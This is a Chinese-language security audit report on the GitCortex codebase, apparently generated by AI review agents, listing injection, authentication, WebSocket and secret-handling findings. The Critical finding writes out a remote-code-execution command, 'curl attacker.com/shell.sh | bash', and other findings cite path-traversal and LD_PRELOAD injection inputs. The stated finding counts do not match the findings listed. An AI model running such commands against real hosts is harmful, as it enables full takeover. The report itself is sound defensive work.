# GitCortex 深度安全审查报告

**审查日期**: 2026-03-16
**审查范围**: 全代码库 (~60,000+ 行代码)
**审查方法**: 8 个并行 AI 安全研究员分域深度审查 + 跨域交叉验证
**审查模型**: Claude Opus 4.6 (多阶段验证，每个发现经过证实/证伪分析)

---

## 目录

- [执行摘要](#执行摘要)
- [风险统计](#风险统计)
- [Critical 级发现](#critical-级发现)
- [High 级发现](#high-级发现)
- [Medium 级发现](#medium-级发现)
- [Low 级发现](#low-级发现)
- [Informational 级发现](#informational-级发现)
- [正面安全发现](#正面安全发现)
- [修复优先级建议](#修复优先级建议)

---

## 执行摘要

对 GitCortex 全代码库进行了深度安全审查，覆盖以下 8 个安全域：

| 审查域 | 覆盖范围 |
|--------|---------|
| 认证、授权与会话管理 | 中间件、路由保护、CORS |
| SQL 注入与数据库安全 | 所有 SQL 查询、数据模型 |
| 命令注入与进程执行 | Executors、Runner、CLI 生成 |
| WebSocket 与 API 安全 | WS 端点、消息验证、MCP |
| 密钥管理与配置安全 | API Key 流转、Docker、CI/CD |
| 前端安全 | XSS、CSRF、WYSIWYG 编辑器 |
| Git 操作与合并安全 | Git 命令注入、路径遍历 |
| 数据流与业务逻辑 | 审批系统、状态机、多租户 |

**总体评价**: GitCortex 在多个领域展现了良好的安全实践（SQL 参数化 100% 覆盖、前端零 `dangerouslySetInnerHTML`、加密 API Key 存储、常量时间比较）。但作为一个自动编排多个 AI CLI 的平台，其**进程执行和认证层**存在需要在生产部署前修复的关键问题。

---

## 风险统计

| 严重级别 | 数量 | 说明 |
|---------|------|------|
| **Critical** | 1 | 需立即修复 |
| **High** | 10 | 需在生产部署前修复 |
| **Medium** | 23 | 应在近期迭代中修复 |
| **Low** | 13 | 建议改进 |
| **Informational** | 5 | 知悉即可 |
| **总计** | **52** | 去重后独立发现 |

---

## Critical 级发现

### SEC-001: Shell 命令注入 via ScriptRequest

- **置信度**: 🔴 高 (已验证)
- **位置**: `crates/executors/src/actions/script.rs:56-63`
- **CVSS 估算**: 9.8

**描述**: `ScriptRequest::spawn()` 将用户提供的 `self.script` 直接传递给 `sh -c`。无任何清理或验证。

**攻击路径**: 用户 → CreateWorkflow(setup_script: "curl attacker.com/shell.sh | bash") → sh -c → 完整 RCE

**影响**: 宿主机完整远程代码执行。

---

## High 级发现

### SEC-002: 认证默认禁用 — 无失败安全机制
- **置信度**: 🔴 高 (5 个审查域独立确认)
- **位置**: `crates/server/src/middleware/auth.rs:55-66`
- 未设置 `GITCORTEX_API_TOKEN` 时所有请求放行

### SEC-003: WebSocket 连接默认无认证 + 无 Origin 验证
- **置信度**: 🔴 高
- **位置**: `crates/server/src/routes/terminal_ws.rs:196-211`, `workflow_ws.rs:78-91`
- 任何网页可连接 ws://localhost:23456/api/terminal/{uuid}

### SEC-004: 终端 WebSocket 缺少授权检查
- **置信度**: 🔴 高
- **位置**: `crates/server/src/routes/terminal_ws.rs:196-211`
- 知道 UUID 即可访问任意终端

### SEC-005: working_dir 路径遍历
- **置信度**: 🔴 高
- **位置**: `crates/executors/src/actions/script.rs:50-53`, `coding_agent_initial.rs:36-39`, `coding_agent_follow_up.rs:37-40`, `review.rs:41-45`
- `../../etc` 可逃逸工作区

### SEC-006: 环境变量注入 via CmdOverrides
- **置信度**: 🔴 高
- **位置**: `crates/executors/src/command.rs:41-61`, `env.rs:40-46`
- 可注入 LD_PRELOAD、PATH、NODE_OPTIONS 等

### SEC-007: base_command_override 允许任意可执行文件
- **置信度**: 🔴 高
- **位置**: `crates/executors/src/command.rs:48`, `:156-167`

### SEC-008: gRPC Runner 无认证接受任意命令
- **置信度**: 🔴 高 (2 个审查域确认)
- **位置**: `crates/runner/src/service.rs:32-82`

### SEC-009: 审批端点缺少授权检查
- **置信度**: 🔴 高
- **位置**: `crates/server/src/routes/approvals.rs:16-48`

### SEC-010: Debug derive 泄露 FeishuConfig/SwitchConfig 密钥
- **置信度**: 🔴 高
- **位置**: `crates/db/src/models/feishu_config.rs`, `crates/cc-switch/src/switcher.rs`

### SEC-011: PlanningDraft API Key 明文存储
- **置信度**: 🔴 高
- **位置**: `crates/db/src/models/planning_draft.rs:21`

---

## Medium 级发现

### SEC-012: CORS 默认允许所有来源
- **位置**: `crates/server/src/routes/mod.rs:21-26`

### SEC-013: Chat Webhook 非常量时间签名比较
- **位置**: `crates/server/src/routes/chat_integrations.rs:269`

### SEC-014: Chat Webhook 使用 SHA256 而非 HMAC
- **位置**: `crates/server/src/routes/chat_integrations.rs:105-121`

### SEC-015: CI Webhook HMAC 在密钥未设置时跳过
- **位置**: `crates/server/src/routes/ci_webhook.rs:30-61`

### SEC-016: MCP Task Server 认证静默跳过
- **位置**: `crates/server/src/mcp/task_server.rs:295-304`

### SEC-017: 无 WebSocket 消息大小限制
- **位置**: `crates/server/src/routes/terminal_ws.rs:208`, `workflow_ws.rs:90`

### SEC-018: 无 WebSocket 连接数限制
- **位置**: `crates/server/src/routes/mod.rs:106-108`

### SEC-019: 无认证端点速率限制
- **位置**: `crates/server/src/middleware/auth.rs:51-103`

### SEC-020: TOML 格式字符串注入 (Codex 配置)
- **位置**: `crates/services/src/services/cc_switch.rs:107-115`

### SEC-021: ACP session_id 文件路径未验证
- **位置**: `crates/executors/src/executors/acp/session.rs:37-39`

### SEC-022: 无 OS 级进程沙箱
- **位置**: 所有 executor spawn 方法

### SEC-023: Droid 默认跳过所有权限检查
- **位置**: `crates/executors/src/executors/droid.rs:37-39`

### SEC-024: API Key 残留在未清理的临时目录
- **位置**: `crates/services/src/services/cc_switch.rs:669-673`

### SEC-025: 任务状态无状态机验证
- **位置**: `crates/server/src/routes/tasks.rs:308`

### SEC-026: NoopApprovalService 对未识别 Executor 自动批准
- **位置**: `crates/local-deployment/src/container.rs:1048-1063`

### SEC-027: 无终端/进程资源限制
- **位置**: `crates/services/src/services/terminal/process.rs`

### SEC-028: 跨项目任务访问 (Task 中间件)
- **位置**: `crates/server/src/middleware/model_loaders.rs:42-67`

### SEC-029: Orchestrator Role 头由客户端控制
- **位置**: `crates/server/src/routes/workflows.rs:318-354`

### SEC-030: 飞书 WebSocket 事件无 Token 验证
- **位置**: `crates/feishu-connector/src/events.rs:31-74`

### SEC-031: window.open() 缺少 noopener,noreferrer
- **位置**: 8 处前端文件

### SEC-032: PR Comment URL 未验证
- **位置**: `frontend/src/components/ui/wysiwyg/nodes/pr-comment-node.tsx:74`

### SEC-033: 无 CSRF Token 保护
- **位置**: `frontend/src/lib/api.ts:122-136`

### SEC-034: OAuth authorize_url 未验证
- **位置**: `frontend/src/components/dialogs/global/OAuthDialog.tsx:46-49`

### SEC-035: 加密密钥无 KDF
- **位置**: `crates/db/src/models/workflow.rs:200-219`

### SEC-036: Windows 允许所有驱动器根目录
- **位置**: `crates/server/src/routes/git.rs:81-92`

### SEC-037: 自定义分支名未验证
- **位置**: `crates/services/src/services/orchestrator/runtime_actions.rs:107-113`

---

## Low 级发现

| ID | 发现 | 位置 |
|----|------|------|
| SEC-038 | Token 长度时序泄露 | `auth.rs:112-115` |
| SEC-039 | 无会话过期机制 | `session.rs:18-27` |
| SEC-040 | 文件系统错误信息泄露 | `filesystem.rs:169-174` |
| SEC-041 | SQLite DELETE journal mode | `db/lib.rs:86` |
| SEC-042 | 文本字段无长度验证 | 多个 create 端点 |
| SEC-043 | CLI 名称回退到数据库原始值 | `terminals.rs:278` |
| SEC-044 | libgit2 合并绕过 Git Hooks | `git.rs:860-871` |
| SEC-045 | Commit 元数据信任不受信任输入 | `git_watcher.rs:82-139` |
| SEC-046 | Git Init 无速率限制 | `git.rs:354-366` |
| SEC-047 | WS URL workflowId 未编码 | `wsStore.ts:644-648` |
| SEC-048 | console.log 生产环境泄露 API URL | `remoteApi.ts:18` |
| SEC-049 | dotenv 生产无条件加载 | 服务器启动 |
| SEC-050 | Git 依赖未锁定 commit hash | `Cargo.toml` |

---

## Informational 级发现

| ID | 发现 | 位置 |
|----|------|------|
| SEC-051 | 健康检查暴露运营信息 | `mod.rs:164-166` |
| SEC-052 | gRPC Proto 无认证字段 | `runner.proto` |
| SEC-053 | PostHog/Sentry Key 在客户端 | `main.tsx` |
| SEC-054 | Symlink 遍历(已缓解) | `git.rs:15-36` |
| SEC-055 | Workflow Status 非类型化字符串 | `workflow.rs:116-127` |

---

## 正面安全发现

| 领域 | 评价 |
|------|------|
| **SQL 参数化** | ✅ 100% 覆盖，无字符串拼接 |
| **前端 XSS 防护** | ✅ 零 dangerouslySetInnerHTML，零 eval() |
| **WYSIWYG 链接清理** | ✅ 阻止 javascript:/vbscript:/data: |
| **API Key 加密** | ✅ AES-256-GCM + 随机 nonce + serde(skip) |
| **Auth 常量时间比较** | ✅ auth 中间件和 CI webhook |
| **错误响应脱敏** | ✅ 500 错误使用通用消息 |
| **OAuth 凭据存储** | ✅ Unix 0o600 + macOS Keychain |
| **iframe 沙箱** | ✅ sandbox 属性 + no-referrer |

---

## 修复优先级建议

### P0 — 立即修复

| ID | 发现 | 工作量 |
|----|------|--------|
| SEC-002 | 生产模式强制 API Token | 小 |
| SEC-003 | WebSocket Origin 验证 | 中 |
| SEC-005 | working_dir 路径遍历防护 | 小 |
| SEC-006 | 环境变量注入黑名单 | 小 |
| SEC-010 | Debug derive 密钥泄露 | 小 |
| SEC-011 | PlanningDraft API Key 加密 | 小 |

### P1 — 近期修复

| ID | 发现 | 工作量 |
|----|------|--------|
| SEC-001 | ScriptRequest 验证/沙箱 | 大 |
| SEC-004 | 终端授权检查 | 中 |
| SEC-009 | 审批端点授权 | 中 |
| SEC-012 | CORS 生产限制 | 小 |
| SEC-013/014 | Chat webhook HMAC | 小 |
| SEC-017/018 | WS 限制 | 小 |
| SEC-028 | 跨项目任务修复 | 小 |

---

*报告由 8 个并行 AI 安全审查 Agent 生成，经交叉验证去重。*
